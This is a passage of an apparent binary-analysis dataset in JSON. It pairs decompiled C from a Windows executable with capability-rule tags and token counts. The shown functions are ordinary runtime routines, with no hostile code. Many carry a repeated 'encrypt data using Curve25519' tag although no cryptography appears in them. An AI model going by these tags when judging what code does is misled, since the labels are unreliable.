            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410cf8(float arg_8h, float arg_ch, uint arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_EAX;\n    uint8_t *puVar2;\n    int32_t in_EDX;\n    double *pdVar3;\n    code *var_8h;\n    uint var_4h;\n    \n    var_8h = *(in_EDX + 8);\n    puVar2 = fcn.004108c8();\n    uVar1 = *puVar2;\n    if ((var_8h & 0xff000000) == 0xff000000) {\n        pdVar3 = (var_8h & 0xffffff) + in_EAX;\n    // switch table (5 cases) at 0x410d40\n        switch(uVar1 & 0x7f) {\n        case 0:\n            *pdVar3 = CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h));\n            break;\n        case 1:\n            *pdVar3 = CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h));\n            break;\n        case 2:\n            *pdVar3 = arg_8h;\n            *(pdVar3 + 4) = arg_ch;\n            *(pdVar3 + 1) = arg_10h;\n            break;\n        case 3:\n            *pdVar3 = ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)));\n            break;\n        case 4:\n            *pdVar3 = ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)) * *0x410eec);\n        }\n    }\n    else {\n        if ((var_8h & 0xff000000) == 0xfe000000) {\n            var_8h = *(*in_EAX + var_8h);\n        }\n        if (*(in_EDX + 0x10) == -0x80000000) {\n    // switch table (5 cases) at 0x410ddc\n            switch(uVar1 & 0x7f) {\n            case 0:\n                (*var_8h)();\n                break;\n            case 1:\n                (*var_8h)(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)));\n                break;\n            case 2:\n                (*var_8h)(arg_8h, arg_ch, arg_10h);\n                break;\n            case 3:\n                (*var_8h)(ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h))));\n                break;\n            case 4:\n                (*var_8h)(ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)) * *0x410eec));\n            }\n        }\n        else {\n    // switch table (5 cases) at 0x410e6f\n            switch(uVar1 & 0x7f) {\n            case 0:\n                (*var_8h)();\n                break;\n            case 1:\n                (*var_8h)(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)));\n                break;\n            case 2:\n                (*var_8h)(arg_8h, arg_ch, arg_10h);\n                break;\n            case 3:\n                (*var_8h)(ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h))));\n                break;\n            case 4:\n                (*var_8h)(ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)) * *0x410eec));\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 812
    },
    "0041407c": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0041407c(int32_t param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    bool bVar4;\n    int32_t iStack16;\n    \n    iVar1 = *(in_EAX + 4) + 0x1f;\n    if (iVar1 < 0) {\n        iVar1 = *(in_EAX + 4) + 0x3e;\n    }\n    iStack16 = param_1;\n    if (-1 < (iVar1 >> 5) + -1) {\n        iVar3 = 0;\n        iStack16 = iVar1 >> 5;\n        do {\n            if (*0x4140f0 != *(*(in_EAX + 8) + iVar3 * 4)) {\n                uVar2 = 0;\n                do {\n                    bVar4 = uVar2 < 0x1f;\n                    if (uVar2 < 0x20) {\n                        bVar4 = (*(*(in_EAX + 8) + iVar3 * 4) >> (uVar2 & 0x1f) & 1) != 0;\n                    }\n                    if (!bVar4) {\n                        iVar1 = iVar3 * 0x20 + (uVar2 & 0x7f);\n                        if (*(in_EAX + 4) <= iVar1) {\n                            iVar1 = *(in_EAX + 4);\n                        }\n                        goto code_r0x004140e8;\n                    }\n                    uVar2 = uVar2 + 1;\n                } while (uVar2 != ' ');\n            }\n            iVar3 = iVar3 + 1;\n            iStack16 = iStack16 + -1;\n        } while (iStack16 != 0);\n    }\n    iVar1 = *(in_EAX + 4);\ncode_r0x004140e8:\n    return CONCAT44(iStack16, iVar1);\n}\n",
        "token_count": 435
    },
    "00415c08": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00415c08(uint arg_8h, uint arg_ch)\n\n{\n    ulong uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00408374(arg_8h, arg_ch);\n    return uVar1;\n}\n",
        "token_count": 69
    },
    "004177fc": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004177fc(uint param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.004187ec(param_1);\n    // switch table (6 cases) at 0x417831\n    switch(uVar1 & 0x7f) {\n    case 0:\n        fcn.00403ffc();\n        break;\n    default:\n        fcn.00416888();\n        break;\n    case 7:\n        fcn.00416db0();\n        fcn.00404098();\n        fcn.004044c0();\n        fcn.00416db0();\n        break;\n    case 8:\n        fcn.00403ffc();\n        break;\n    case 9:\n        fcn.00403ffc();\n        break;\n    case 0xd:\n        fcn.00403ffc();\n    }\n    return;\n}\n",
        "token_count": 193
    },
    "004188fc": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.004188fc(void)\n\n{\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    var_8h = 0;\n    uStack20 = 0x418a8b;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    uVar1 = fcn.004187ec();\n    // switch table (21 cases) at 0x418933\n    switch(uVar1 & 0x7f) {\n    case 1:\n        fcn.00418848(&stack0xfffffffc);\n        break;\n    case 2:\n        fcn.00418cf4();\n        break;\n    case 3:\n        fcn.00418cf4();\n        break;\n    case 4:\n        fcn.00418cf4();\n        break;\n    case 5:\n        fcn.00418cf4();\n        break;\n    case 6:\n    case 7:\n        fcn.00418610();\n        break;\n    case 10:\n        fcn.00418870(&stack0xfffffffc);\n        break;\n    case 0xb:\n        fcn.00418800();\n        break;\n    case 0xc:\n        fcn.00418870(&stack0xfffffffc);\n        break;\n    case 0xe:\n        fcn.004188a0(&stack0xfffffffc);\n        break;\n    case 0xf:\n        fcn.00418cf4();\n        break;\n    case 0x10:\n        fcn.00418cf4();\n        break;\n    case 0x11:\n        fcn.00418cf4();\n        break;\n    case 0x12:\n        fcn.00418870(&stack0xfffffffc);\n        break;\n    case 0x13:\n        fcn.00418cf4();\n        break;\n    case 0x14:\n        fcn.00418870(&stack0xfffffffc);\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x418a92;\n    uStack20 = 0x418a8a;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 517
    },
    "00418f04": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.00418f04(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    ulong uVar3;\n    uint in_stack_ffffffc8;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_1ch;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x4190fe;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    fcn.0040eac4();\n    uVar2 = fcn.00416d8c();\n    // switch table (21 cases) at 0x418f46\n    switch(uVar2 & 0x7f) {\n    case 0:\n    case 0xd:\n        cVar1 = fcn.004187ec();\n        if (cVar1 != '\\r') {\n            fcn.00410650();\n        }\n        break;\n    default:\n        fcn.0040b5f4();\n        fcn.004039e4();\n        break;\n    case 2:\n        fcn.004178fc();\n        fcn.0040fda0();\n        break;\n    case 3:\n        fcn.004178fc();\n        fcn.0040fda0();\n        break;\n    case 4:\n        fcn.004178fc();\n        fcn.0040fda0();\n        break;\n    case 5:\n        fcn.004176e0();\n        fcn.0040fe30();\n        break;\n    case 6:\n    case 0xc:\n        fcn.0041864c();\n        fcn.0040fe6c();\n        break;\n    case 8:\n    case 9:\n        fcn.004187ec();\n        fcn.0040fe08();\n        break;\n    case 10:\n        in_stack_ffffffc8 = 0x4190a1;\n        fcn.00418d3c(&stack0xfffffffc);\n        fcn.0040edec();\n        break;\n    case 0xf:\n        fcn.00417724();\n        fcn.0040fe30();\n        break;\n    case 0x10:\n        fcn.00417768();\n        fcn.0040fe58();\n        break;\n    case 0x11:\n        fcn.004177b8();\n        fcn.0040fe44();\n        break;\n    case 0x12:\n    case 0x14:\n        fcn.00418708();\n        fcn.0040fe98();\n        break;\n    case 0x13:\n        uVar3 = fcn.00417968();\n        in_stack_ffffffc8 = uVar3;\n        fcn.0040fddc(in_stack_ffffffc8, uVar3 >> 0x20);\n    }\n    *in_FS_OFFSET = in_stack_ffffffc8;\n    uStack48 = 0x419105;\n    fcn.0040ead8();\n    fcn.00404688();\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 708
    },
    "0042c1d8": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.0042c1d8(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    do {\n        if (*(in_EAX + 0xc + (uVar1 & 0x7f) * 4) != -1) {\n            fcn.0042bfb4();\n        }\n        *(in_EAX + 0xc + (uVar1 & 0x7f) * 4) = 0xffffffff;\n        uVar1 = uVar1 + 1;\n    } while (uVar1 != '\\x04');\n    fcn.0042c0b8();\n    *(in_EAX + 8) = 0;\n    return;\n}\n",
        "token_count": 167
    },
    "0042f24c": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.0042f24c(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    do {\n        iVar1 = *(in_EAX + 8 + (uVar2 & 0x7f) * 4);\n        if (iVar1 != 0) {\n            (***0x462000)(iVar1);\n            *(in_EAX + 8 + (uVar2 & 0x7f) * 4) = 0;\n        }\n        uVar2 = uVar2 + 1;\n    } while (uVar2 != '\\x18');\n    return;\n}\n",
        "token_count": 154
    },
    "0042f484": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042f484(uchar *param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    *param_1 = 0;\n    uVar1 = param_2 & 0xff;\n    if (uVar1 < 0xf) {\n        if (uVar1 - 2 < 5) {\n            *(param_1 + 4) = 1;\n            iVar2 = 2;\n            goto code_r0x0042f4fd;\n        }\n        if (uVar1 - 7 < 8) {\n            *(param_1 + 4) = 2;\n            iVar2 = 7;\n            goto code_r0x0042f4fd;\n        }\n    }\n    else {\n        if (uVar1 - 0xf < 0xc) {\n            *(param_1 + 4) = 3;\n            iVar2 = 0xf;\n            goto code_r0x0042f4fd;\n        }\n        if (uVar1 - 0x1b < 2) {\n            *(param_1 + 4) = 4;\n            iVar2 = 0x1b;\n            goto code_r0x0042f4fd;\n        }\n        if (uVar1 - 0x1b == 2) {\n            *(param_1 + 4) = 5;\n            iVar2 = 0x1d;\n            goto code_r0x0042f4fd;\n        }\n    }\n    *(param_1 + 4) = 0;\n    iVar2 = 0;\ncode_r0x0042f4fd:\n    *(param_1 + 8) = ((param_2 & 0x7f) - iVar2) + 1;\n    return;\n}\n",
        "token_count": 401
    },
    "0042f508": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042f508(uchar *param_1, uint32_t param_2)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    \n    *param_1 = 3;\n    uVar1 = param_2 - 2;\n    if (uVar1 < 7) {\n        *(param_1 + 4) = 1;\n        iVar2 = 2;\n    }\n    else if (uVar1 == 7) {\n        *(param_1 + 4) = 2;\n        iVar2 = 9;\n    }\n    else {\n        *(param_1 + 4) = 0;\n        iVar2 = 0;\n    }\n    *(param_1 + 8) = ((param_2 & 0x7f) - iVar2) + 1;\n    return;\n}\n",
        "token_count": 188
    },
    "0042f544": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042f544(uchar *param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    *param_1 = 0x12;\n    uVar1 = param_2 & 0xff;\n    if (uVar1 < 0x14) {\n        if (uVar1 - 2 < 6) {\n            *(param_1 + 4) = 1;\n            iVar2 = 2;\n            goto code_r0x0042f5d3;\n        }\n        if (uVar1 - 8 < 6) {\n            *(param_1 + 4) = 2;\n            iVar2 = 8;\n            goto code_r0x0042f5d3;\n        }\n        if (uVar1 - 0xe < 6) {\n            *(param_1 + 4) = 3;\n            iVar2 = 0xe;\n            goto code_r0x0042f5d3;\n        }\n    }\n    else {\n        if (uVar1 - 0x14 < 6) {\n            *(param_1 + 4) = 4;\n            iVar2 = 0x14;\n            goto code_r0x0042f5d3;\n        }\n        if (uVar1 - 0x1a < 6) {\n            *(param_1 + 4) = 5;\n            iVar2 = 0x1a;\n            goto code_r0x0042f5d3;\n        }\n        if (uVar1 - 0x20 < 6) {\n            *(param_1 + 4) = 6;\n            iVar2 = 0x20;\n            goto code_r0x0042f5d3;\n        }\n    }\n    *(param_1 + 4) = 0;\n    iVar2 = 0;\ncode_r0x0042f5d3:\n    *(param_1 + 8) = ((param_2 & 0x7f) - iVar2) + 1;\n    return;\n}\n",
        "token_count": 460
    },
    "0042f5e0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042f5e0(uchar *param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    *param_1 = 0x17;\n    // switch table (38 cases) at 0x42f666\n    switch(param_2 & 0xff) {\n    default:\n        *(param_1 + 4) = 0;\n        iVar1 = 0;\n        break;\n    case 2:\n    case 3:\n    case 4:\n        *(param_1 + 4) = 1;\n        iVar1 = 2;\n        break;\n    case 5:\n    case 6:\n    case 7:\n        *(param_1 + 4) = 2;\n        iVar1 = 5;\n        break;\n    case 8:\n    case 9:\n    case 10:\n        *(param_1 + 4) = 3;\n        iVar1 = 8;\n        break;\n    case 0xb:\n    case 0xc:\n    case 0xd:\n        *(param_1 + 4) = 4;\n        iVar1 = 0xb;\n        break;\n    case 0xe:\n    case 0xf:\n    case 0x10:\n        *(param_1 + 4) = 5;\n        iVar1 = 0xe;\n        break;\n    case 0x11:\n    case 0x12:\n    case 0x13:\n        *(param_1 + 4) = 6;\n        iVar1 = 0x11;\n        break;\n    case 0x14:\n    case 0x15:\n        *(param_1 + 4) = 7;\n        iVar1 = 0x14;\n        break;\n    case 0x16:\n    case 0x17:\n        *(param_1 + 4) = 8;\n        iVar1 = 0x16;\n        break;\n    case 0x18:\n    case 0x19:\n        *(param_1 + 4) = 9;\n        iVar1 = 0x18;\n        break;\n    case 0x1a:\n    case 0x1b:\n        *(param_1 + 4) = 10;\n        iVar1 = 0x1a;\n        break;\n    case 0x1c:\n    case 0x1d:\n        *(param_1 + 4) = 0xb;\n        iVar1 = 0x1c;\n        break;\n    case 0x1e:\n    case 0x1f:\n        *(param_1 + 4) = 0xc;\n        iVar1 = 0x1e;\n        break;\n    case 0x20:\n    case 0x21:\n    case 0x22:\n    case 0x23:\n        *(param_1 + 4) = 0xd;\n        iVar1 = 0x20;\n        break;\n    case 0x24:\n    case 0x25:\n    case 0x26:\n    case 0x27:\n        *(param_1 + 4) = 0xe;\n        iVar1 = 0x24;\n        break;\n    case 0x28:\n    case 0x29:\n    case 0x2a:\n    case 0x2b:\n        *(param_1 + 4) = 0xf;\n        iVar1 = 0x28;\n        break;\n    case 0x2c:\n    case 0x2d:\n    case 0x2e:\n    case 0x2f:\n        *(param_1 + 4) = 0x10;\n        iVar1 = 0x2c;\n        break;\n    case 0x30:\n    case 0x31:\n    case 0x32:\n    case 0x33:\n        *(param_1 + 4) = 0x11;\n        iVar1 = 0x30;\n        break;\n    case 0x34:\n    case 0x35:\n    case 0x36:\n    case 0x37:\n        *(param_1 + 4) = 0x12;\n        iVar1 = 0x34;\n        break;\n    case 0x38:\n    case 0x39:\n    case 0x3a:\n    case 0x3b:\n        *(param_1 + 4) = 0x13;\n        iVar1 = 0x38;\n        break;\n    case 0x3c:\n    case 0x3d:\n    case 0x3e:\n    case 0x3f:\n        *(param_1 + 4) = 0x14;\n        iVar1 = 0x3c;\n        break;\n    case 0x40:\n    case 0x41:\n    case 0x42:\n    case 0x43:\n        *(param_1 + 4) = 0x15;\n        iVar1 = 0x40;\n        break;\n    case 0x44:\n    case 0x45:\n    case 0x46:\n    case 0x47:\n        *(param_1 + 4) = 0x16;\n        iVar1 = 0x44;\n        break;\n    case 0x48:\n    case 0x49:\n    case 0x4a:\n    case 0x4b:\n        *(param_1 + 4) = 0x17;\n        iVar1 = 0x48;\n        break;\n    case 0x4c:\n    case 0x4d:\n    case 0x4e:\n    case 0x4f:\n        *(param_1 + 4) = 0x18;\n        iVar1 = 0x4c;\n        break;\n    case 0x50:\n    case 0x51:\n    case 0x52:\n    case 0x53:\n        *(param_1 + 4) = 0x19;\n        iVar1 = 0x50;\n        break;\n    case 0x54:\n    case 0x55:\n    case 0x56:\n    case 0x57:\n        *(param_1 + 4) = 0x1a;\n        iVar1 = 0x54;\n        break;\n    case 0x58:\n    case 0x59:\n    case 0x5a:\n    case 0x5b:\n        *(param_1 + 4) = 0x1b;\n        iVar1 = 0x58;\n        break;\n    case 0x5c:\n    case 0x5d:\n    case 0x5e:\n    case 0x5f:\n        *(param_1 + 4) = 0x1c;\n        iVar1 = 0x5c;\n        break;\n    case 0x60:\n        *(param_1 + 4) = 0x1d;\n        iVar1 = 0x60;\n        break;\n    case 0x61:\n        *(param_1 + 4) = 0x1e;\n        iVar1 = 0x61;\n        break;\n    case 0x62:\n        *(param_1 + 4) = 0x1f;\n        iVar1 = 0x62;\n        break;\n    case 99:\n        *(param_1 + 4) = 0x20;\n        iVar1 = 99;\n        break;\n    case 100:\n        *(param_1 + 4) = 0x21;\n        iVar1 = 100;\n        break;\n    case 0x65:\n        *(param_1 + 4) = 0x22;\n        iVar1 = 0x65;\n        break;\n    case 0x66:\n        *(param_1 + 4) = 0x23;\n        iVar1 = 0x66;\n        break;\n    case 0x67:\n        *(param_1 + 4) = 0x24;\n        iVar1 = 0x67;\n        break;\n    case 0x68:\n        *(param_1 + 4) = 0x25;\n        iVar1 = 0x68;\n    }\n    *(param_1 + 8) = ((param_2 & 0x7f) - iVar1) + 1;\n    return;\n}\n",
        "token_count": 1831
    },
    "00402b54": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402b54(uint8_t param_1, uint8_t *param_2)\n\n{\n    uint8_t *in_EAX;\n    \n    if (*param_2 < param_1) {\n        param_1 = *param_2;\n    }\n    *in_EAX = param_1;\n    fcn.004028b8();\n    return;\n}\n",
        "token_count": 84
    },
    "00402d88": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402d88(uint32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    char cVar2;\n    char *in_EAX;\n    \n    param_1 = param_1 & 0xff;\n    do {\n        if (param_1 == 0) {\n            return;\n        }\n        param_1 = param_1 - 1;\n        cVar1 = *in_EAX;\n        cVar2 = *param_2;\n        in_EAX = in_EAX + 1;\n        param_2 = param_2 + 1;\n    } while (cVar1 == cVar2);\n    return;\n}\n",
        "token_count": 149
    },
    "00403aa8": {
        "rules": [
            "calculate modulo 256 via x86 assembly",
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403aa8(int32_t *arg_8h)\n\n{\n    fcn.004027c0();\n    return;\n}\n",
        "token_count": 34
    },
    "0040a640": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040a640(uint param_1, uint32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    \n    while( true ) {\n        uVar2 = fcn.00404268();\n        if ((uVar2 < *param_2) ||\n           (cVar1 = *(in_EAX + -1 + *param_2),  uVar2 = *param_2 & 0xffffff00 | cVar1 - 0x3a,  cVar1 - 0x30U < 10))\n        break;\n        uVar2 = *(in_EAX + -1 + *param_2);\n        if ((*((uVar2 >> 3) + 0x46110c) >> (uVar2 & 7) & 1) == 0) {\n            *param_2 = *param_2 + 1;\n        }\n        else {\n            uVar2 = fcn.0040c160();\n            *param_2 = uVar2;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 250
    },
    "0040bb18": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040bb18(void)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd4;\n    uint *arg_ch;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x40bbd3;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    var_4h = in_EAX;\n    uVar2 = fcn.0040b8b4();\n    uVar2 = uVar2 & 0xff;\n    if (7 < uVar2 - 3) {\n        if (uVar2 == 0xb) {\n            in_stack_ffffffd4 = 0x40bb71;\n            iVar3 = fcn.0040b94c(&stack0xfffffffc);\n            goto code_r0x0040bba6;\n        }\n        if (9 < uVar2 - 0xc) {\n            var_ch = *var_4h;\n            var_8h._0_1_ = 0;\n            arg_ch = &fcn.0040bb18::var_ch;\n            in_stack_ffffffd4 = 0;\n            fcn.00405b0c();\n            iVar3 = fcn.0040b574(in_stack_ffffffd4, arg_ch);\n            goto code_r0x0040bba6;\n        }\n    }\n    iVar3 = fcn.0040b538();\ncode_r0x0040bba6:\n    cVar1 = fcn.004033e4();\n    if (cVar1 != '\\0') {\n        *(iVar3 + 0xc) = var_4h;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd4;\n    uStack36 = 0x40bbda;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 487
    },
    "0040bfa8": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bfa8(int32_t *arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t *in_ECX;\n    int32_t in_EDX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00404268();\n    iVar4 = 1;\n    iVar3 = 1;\n    while ((iVar3 < iVar1 && (iVar4 < in_EDX))) {\n        iVar4 = iVar4 + 1;\n        uVar2 = *(in_EAX + -1 + iVar3);\n        if ((*((uVar2 >> 3) + 0x46110c) >> (uVar2 & 7) & 1) == 0) {\n            iVar3 = iVar3 + 1;\n        }\n        else {\n            iVar3 = fcn.0040c160();\n        }\n    }\n    if (((iVar4 == in_EDX) && (iVar3 < iVar1)) &&\n       (uVar2 = *(in_EAX + -1 + iVar3),  (*((uVar2 >> 3) + 0x46110c) >> (uVar2 & 7) & 1) != 0)) {\n        iVar3 = fcn.0040c160();\n        iVar3 = iVar3 + -1;\n    }\n    *in_ECX = iVar4;\n    *arg_8h = iVar3;\n    return;\n}\n",
        "token_count": 351
    },
    "0040c454": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040c454(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    uint uVar3;\n    char cVar4;\n    int32_t iVar5;\n    uint var_1h;\n    \n    uVar3 = fcn.0040c3e0(arg_8h + -0x14);\n    sub.kernel32.dll_GetCPInfo(uVar3);\n    for (iVar5 = 0; (iVar5 < 0xc && ((*(arg_8h + -0xe + iVar5) | *(arg_8h + -0xd + iVar5)) != 0)); iVar5 = iVar5 + 2) {\n        var_1h._0_1_ = *(arg_8h + -0xe + iVar5);\n        uVar1 = *(arg_8h + -0xd + iVar5);\n        if (var_1h <= uVar1) {\n            cVar4 = (uVar1 - var_1h) + '\\x01';\n            do {\n                puVar2 = (var_1h >> 3) + 0x46110c;\n                *puVar2 = *puVar2 | '\\x01' << (var_1h & 7);\n                var_1h._0_1_ = var_1h + 1;\n                cVar4 = cVar4 + -1;\n            } while (cVar4 != '\\0');\n        }\n    }\n    return;\n}\n",
        "token_count": 360
    },
    "0040cc1c": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nuint * fcn.0040cc1c(void)\n\n{\n    uint *puVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    uVar2 = fcn.0040cb7c();\n    puVar1 = *(in_EAX + 4 + (uVar2 & 0xff) * 4);\n    while( true ) {\n        if (puVar1 == NULL) {\n            return NULL;\n        }\n        iVar3 = fcn.0040cb1c();\n        if (iVar3 != 0x7fffffff) break;\n        puVar1 = *puVar1;\n    }\n    uVar4 = sub.kernel32.dll_GetCurrentThreadId_1();\n    puVar1[1] = uVar4;\n    return puVar1;\n}\n",
        "token_count": 186
    },
    "0041c430": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.0041c430(void)\n\n{\n    uint32_t in_EAX;\n    \n    if (in_EAX < 0) {\n        sub.user32.dll_GetSysColor(in_EAX & 0xff);\n    }\n    return;\n}\n",
        "token_count": 54
    },
    "00444ca4": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
